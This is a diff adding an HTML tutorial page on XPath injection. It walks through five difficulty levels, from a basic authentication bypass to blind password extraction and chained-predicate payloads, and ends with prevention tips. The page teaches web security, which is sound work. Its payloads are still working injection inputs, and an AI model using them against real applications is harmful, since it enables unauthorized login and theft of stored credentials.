@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XPath Injection Tutorial - Difficulty Levels</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .navbar {
+            background: #333;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+        }
+        .navbar a {
+            color: white;
+            text-decoration: none;
+            padding: 10px 20px;
+            margin-right: 10px;
+            border-radius: 4px;
+        }
+        .navbar a:hover {
+            background: #555;
+        }
+        .navbar a.active {
+            background: #4CAF50;
+        }
+        .content {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 30px;
+        }
+        h2 {
+            color: #2196F3;
+            margin-top: 40px;
+            margin-bottom: 20px;
+        }
+        .level-header {
+            background: #e3f2fd;
+            padding: 10px 20px;
+            border-radius: 4px;
+            margin: 30px 0 20px;
+        }
+        .difficulty {
+            color: #fff;
+            padding: 3px 8px;
+            border-radius: 3px;
+            font-size: 14px;
+            margin-left: 10px;
+        }
+        .easy { background: #4CAF50; }
+        .medium { background: #FFC107; }
+        .hard { background: #FF5722; }
+        .expert { background: #F44336; }
+        .master { background: #9C27B0; }
+        .code-block {
+            background: #2d2d2d;
+            color: #fff;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 15px 0;
+            white-space: pre-wrap;
+            font-family: monospace;
+            position: relative;
+        }
+        .code-label {
+            position: absolute;
+            top: 0;
+            right: 0;
+            background: #444;
+            color: #fff;
+            padding: 2px 8px;
+            font-size: 12px;
+            border-radius: 0 4px 0 4px;
+        }
+        .highlight {
+            background: #ffeb3b;
+            padding: 2px 4px;
+            border-radius: 2px;
+        }
+        .diagram {
+            width: 100%;
+            max-width: 800px;
+            margin: 20px auto;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <a href="index.html">XPath Tester</a>
+        <a href="tutorial.html">Tutorial</a>
+        <a href="injection.html" class="active">Injection</a>
+    </div>
+    
+    <div class="content">
+        <h1>XPath Injection - From Basics to Advanced</h1>
+
+        <h2>Visual Understanding of XPath Injection</h2>
+        <svg class="diagram" viewBox="0 0 800 400">
+            <!-- XML Document Structure -->
+            <rect x="50" y="50" width="200" height="300" fill="#e3f2fd" stroke="#2196F3" stroke-width="2"/>
+            <text x="150" y="80" text-anchor="middle" fill="#1565C0">XML Document</text>
+            
+            <!-- XPath Query Path -->
+            <path d="M 250 200 C 400 200 400 200 550 200" stroke="#FF5722" stroke-width="3" fill="none" marker-end="url(#arrowhead)"/>
+            
+            <!-- Injection Point -->
+            <circle cx="400" cy="200" r="20" fill="#F44336"/>
+            <text x="400" y="205" text-anchor="middle" fill="white">'</text>
+            
+            <!-- Result -->
+            <rect x="550" y="50" width="200" height="300" fill="#e8f5e9" stroke="#4CAF50" stroke-width="2"/>
+            <text x="650" y="80" text-anchor="middle" fill="#2E7D32">Query Result</text>
+            
+            <!-- Arrowhead marker -->
+            <defs>
+                <marker id="arrowhead" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
+                    <polygon points="0 0, 10 3.5, 0 7" fill="#FF5722"/>
+                </marker>
+            </defs>
+            
+            <!-- Labels -->
+            <text x="400" y="150" text-anchor="middle" fill="#333">Injection Point</text>
+            <text x="400" y="250" text-anchor="middle" fill="#333">Modified Query Logic</text>
+        </svg>
+
+        <h2 class="level-header">Level 1 - Basic Authentication Bypass<span class="difficulty easy">Easy</span></h2>
+        <p>The simplest form of XPath injection involves basic authentication bypass using OR conditions.</p>
+        
+        <div class="code-block">
+            <span class="code-label">xml</span>
+&lt;users&gt;
+    &lt;user&gt;
+        &lt;username&gt;admin&lt;/username&gt;
+        &lt;password&gt;secretpass&lt;/password&gt;
+    &lt;/user&gt;
+&lt;/users&gt;</div>
+
+        <p>Vulnerable Query:</p>
+        <div class="code-block">
+            <span class="code-label">xpath</span>
+//user[username/text()='$username' and password/text()='$password']</div>
+
+        <p>Payload: <span class="highlight">admin' or '1'='1</span></p>
+
+        <h2 class="level-header">Level 2 - Blind XPath Injection<span class="difficulty medium">Medium</span></h2>
+        <p>When no direct output is visible, we can use boolean-based injection techniques.</p>
+
+        <div class="code-block">
+            <span class="code-label">xpath</span>
+//user[username/text()='$username' and substring(password/text(),1,1)='a']</div>
+
+        <p>Payload to extract password character by character:</p>
+        <div class="code-block">
+            <span class="code-label">payload</span>
+admin' and substring(//user[position()=1]/password,1,1)='a</div>
+
+        <h2 class="level-header">Level 3 - Numeric Operations<span class="difficulty hard">Hard</span></h2>
+        <p>Using XPath's numeric functions to bypass more complex filters.</p>
+
+        <div class="code-block">
+            <span class="code-label">xml</span>
+&lt;accounts&gt;
+    &lt;account&gt;
+        &lt;id&gt;1&lt;/id&gt;
+        &lt;balance&gt;1000&lt;/balance&gt;
+        &lt;type&gt;admin&lt;/type&gt;
+    &lt;/account&gt;
+&lt;/accounts&gt;</div>
+
+        <p>Payload using numeric operations:</p>
+        <div class="code-block">
+            <span class="code-label">payload</span>
+' or number(substring(//account[position()=1]/balance,1))>0 and '1'='1</div>
+
+        <h2 class="level-header">Level 4 - Advanced Function Injection<span class="difficulty expert">Expert</span></h2>
+        <p>Leveraging XPath functions for complex data extraction.</p>
+
+        <div class="code-block">
+            <span class="code-label">xpath</span>
+//user[username/text()='$username' and contains(role/text(), 'admin')]</div>
+
+        <p>Advanced payload using multiple functions:</p>
+        <div class="code-block">
+            <span class="code-label">payload</span>
+' or string-length(name(/*[position()=1]))=4 or '1'='2</div>
+
+        <h2 class="level-header">Level 5 - Chained Predicates<span class="difficulty master">Master</span></h2>
+        <p>Using complex predicate chains to bypass sophisticated filters.</p>
+
+        <div class="code-block">
+            <span class="code-label">xml</span>
+&lt;system&gt;
+    &lt;users&gt;
+        &lt;user role="admin" access="restricted"&gt;
+            &lt;credentials&gt;
+                &lt;username&gt;admin&lt;/username&gt;
+                &lt;password&gt;complex!pass&lt;/password&gt;
+            &lt;/credentials&gt;
+        &lt;/user&gt;
+    &lt;/users&gt;
+&lt;/system&gt;</div>
+
+        <p>Complex payload with chained predicates:</p>
+        <div class="code-block">
+            <span class="code-label">payload</span>
+' or //*[contains(name(),'user')][position()=1]/@*[name()='role']='admin' or '1'='2</div>
+
+        <h2>Prevention Techniques</h2>
+        <ul>
+            <li>Use parameterized XPath queries</li>
+            <li>Implement proper input validation</li>
+            <li>Use XPath query libraries that handle escaping</li>
+            <li>Consider using XML security policies</li>
+            <li>Implement proper error handling to avoid information leakage</li>
+        </ul>
+    </div>
+</body>
+</html>
